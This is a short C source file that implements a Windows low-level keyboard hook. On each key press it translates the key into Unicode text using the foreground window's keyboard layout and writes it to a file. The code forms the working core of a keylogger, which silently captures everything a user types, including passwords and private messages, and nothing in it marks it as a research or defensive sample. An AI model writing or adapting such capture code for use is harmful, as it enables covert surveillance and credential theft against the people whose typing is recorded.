#include "../inc/main.h"

LRESULT CALLBACK llKeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0)
    {
        LPKBDLLHOOKSTRUCT kbdll = (LPKBDLLHOOKSTRUCT)lParam;
        if (!(kbdll->flags & LLKHF_UP))
        {
            WCHAR wszBuf[WSZBUFSIZE];
            BYTE  bState[256];

            GetKeyState(0);
            GetKeyboardState(bState);

            HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

            int len = ToUnicodeEx(kbdll->vkCode, kbdll->scanCode, bState, wszBuf, WSZBUFSIZE, 0b110, hkl);
            if (len > 0)
                wszBuf[len] = '\0';
            
            BOOL bSucces = WriteFile(hFile, wszBuf, len*sizeof(WCHAR), NULL, NULL);
        }  
        return 0;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
};